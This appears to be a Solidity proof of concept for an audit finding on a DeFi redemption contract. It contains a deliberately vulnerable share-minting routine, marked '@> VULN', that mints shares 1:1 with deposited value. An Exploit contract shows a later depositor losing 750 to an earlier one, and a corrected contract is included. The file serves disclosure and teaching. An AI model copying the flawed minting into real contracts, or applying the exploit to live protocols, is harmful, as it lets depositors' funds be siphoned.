// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  STBL ESS — STBL_Redemption_Core.iDeposit (Cyfrin, 2026-06-17).
    Shares are a claim on pool value, but iDeposit mints 1:1 with
    stableValueNet. After a redeem leaves the pool at 0.60 per share,
    Charlie deposits 3_000 and is credited 3_000 shares worth 2_250.
    The missing 750 is claimable by Alice. Minting at
    assets * supply / poolValue credits Charlie 5_000 shares and he
    withdraws his full 3_000. */

contract USST {
    string public symbol = "USST";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract YLD {
    struct NFTData {
        uint256 stableValueNet;
    }

    uint256 public nextId = 1;
    mapping(uint256 => NFTData) public nftData;
    mapping(uint256 => address) public ownerOf;

    function issue(address to, uint256 value) external returns (uint256 id) {
        id = nextId++;
        nftData[id].stableValueNet = value;
        ownerOf[id] = to;
    }

    function getNFTData(uint256 id) external view returns (NFTData memory) {
        return nftData[id];
    }

    function merge(uint256 keep, uint256 add) external returns (uint256) {
        nftData[keep].stableValueNet += nftData[add].stableValueNet;
        delete nftData[add];
        return keep;
    }

    function shrink(uint256 id, uint256 amount) external {
        nftData[id].stableValueNet -= amount;
    }
}

contract Actor {
    function approve(USST token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }

    function call(address to, bytes calldata data) external returns (bytes memory) {
        (bool ok, bytes memory ret) = to.call(data);
        require(ok, "actor");
        return ret;
    }
}

contract Redemption {
    struct UserData {
        uint256 stableValueNet;
    }

    USST public usst;
    YLD public yld;
    uint256 public totalSupply;
    uint256 public NFTID;
    mapping(address => UserData) public userData;

    constructor(USST _usst, YLD _yld) {
        usst = _usst;
        yld = _yld;
    }

    function iFetchShare(address user) public view returns (uint256) {
        if (totalSupply == 0) return 0;
        return (userData[user].stableValueNet * yld.getNFTData(NFTID).stableValueNet) / totalSupply;
    }

    function deposit(uint256 id) external {
        require(yld.ownerOf(id) == msg.sender, "owner");
        _iDeposit(id);
    }

    function _iDeposit(uint256 id) internal {
        YLD.NFTData memory meta = yld.getNFTData(id);
        if (NFTID == 0) {
            NFTID = id;
            userData[msg.sender].stableValueNet += meta.stableValueNet;
            totalSupply += meta.stableValueNet;
        } else {
            NFTID = yld.merge(NFTID, id);
            // @> VULN: shares are minted 1:1 with stableValueNet, ignoring pool value / totalSupply
            userData[msg.sender].stableValueNet += meta.stableValueNet;
            totalSupply += meta.stableValueNet;
        }
    }

    function redeem(uint256 amount) external {
        require(usst.transferFrom(msg.sender, address(this), amount), "pull");
        yld.shrink(NFTID, amount);
    }

    function withdraw() external returns (uint256 claim) {
        claim = iFetchShare(msg.sender);
        uint256 shares = userData[msg.sender].stableValueNet;
        userData[msg.sender].stableValueNet = 0;
        totalSupply -= shares;
        yld.shrink(NFTID, claim);
        require(usst.transfer(msg.sender, claim), "pay");
    }
}

contract RedemptionFixed {
    struct UserData {
        uint256 stableValueNet;
    }

    USST public usst;
    YLD public yld;
    uint256 public totalSupply;
    uint256 public NFTID;
    mapping(address => UserData) public userData;

    constructor(USST _usst, YLD _yld) {
        usst = _usst;
        yld = _yld;
    }

    function iFetchShare(address user) public view returns (uint256) {
        if (totalSupply == 0) return 0;
        return (userData[user].stableValueNet * yld.getNFTData(NFTID).stableValueNet) / totalSupply;
    }

    function deposit(uint256 id) external {
        YLD.NFTData memory meta = yld.getNFTData(id);
        uint256 shares;
        if (NFTID == 0) {
            shares = meta.stableValueNet;
            NFTID = id;
        } else {
            uint256 poolValue = yld.getNFTData(NFTID).stableValueNet;
            shares = (meta.stableValueNet * totalSupply) / poolValue;
            NFTID = yld.merge(NFTID, id);
        }
        userData[msg.sender].stableValueNet += shares;
        totalSupply += shares;
    }

    function redeem(uint256 amount) external {
        require(usst.transferFrom(msg.sender, address(this), amount), "pull");
        yld.shrink(NFTID, amount);
    }

    function withdraw() external returns (uint256 claim) {
        claim = iFetchShare(msg.sender);
        uint256 shares = userData[msg.sender].stableValueNet;
        userData[msg.sender].stableValueNet = 0;
        totalSupply -= shares;
        yld.shrink(NFTID, claim);
        require(usst.transfer(msg.sender, claim), "pay");
    }
}

contract Exploit {
    USST public usst;
    YLD public yld;
    Redemption public redemption;
    Actor public alice;
    Actor public bob;
    Actor public charlie;
    uint256 public aliceGain;
    uint256 public charlieClaim;
    uint256 public charlieDeposit;

    constructor() {
        usst = new USST();
        yld = new YLD();
        redemption = new Redemption(usst, yld);
        alice = new Actor();
        bob = new Actor();
        charlie = new Actor();
    }

    function run() external {
        uint256 aliceId = yld.issue(address(alice), 5000 ether);
        alice.call(address(redemption), abi.encodeWithSignature("deposit(uint256)", aliceId));
        usst.mint(address(redemption), 5000 ether);
        usst.mint(address(bob), 2000 ether);
        bob.approve(usst, address(redemption), 2000 ether);
        bob.call(address(redemption), abi.encodeWithSignature("redeem(uint256)", 2000 ether));
        uint256 poolBefore = yld.getNFTData(redemption.NFTID()).stableValueNet;
        uint256 supplyBefore = redemption.totalSupply();
        uint256 alicePre = redemption.iFetchShare(address(alice));
        charlieDeposit = 3000 ether;
        uint256 charlieId = yld.issue(address(charlie), charlieDeposit);
        charlie.call(address(redemption), abi.encodeWithSignature("deposit(uint256)", charlieId));
        usst.mint(address(redemption), charlieDeposit);
        charlieClaim = redemption.iFetchShare(address(charlie));
        uint256 alicePost = redemption.iFetchShare(address(alice));
        aliceGain = alicePost - alicePre;
        alice.call(address(redemption), abi.encodeWithSignature("withdraw()"));
        uint256 paid = usst.balanceOf(address(alice));
        require(poolBefore * 1e18 / supplyBefore == 0.6 ether, "rate");
        require(charlieClaim == 2250 ether, "charlie");
        require(charlieDeposit - charlieClaim == 750 ether, "loss");
        require(aliceGain == 750 ether, "gain");
        require(paid == 3750 ether, "alice paid");
        require(aliceGain == charlieDeposit - charlieClaim, "transfer");
    }
}
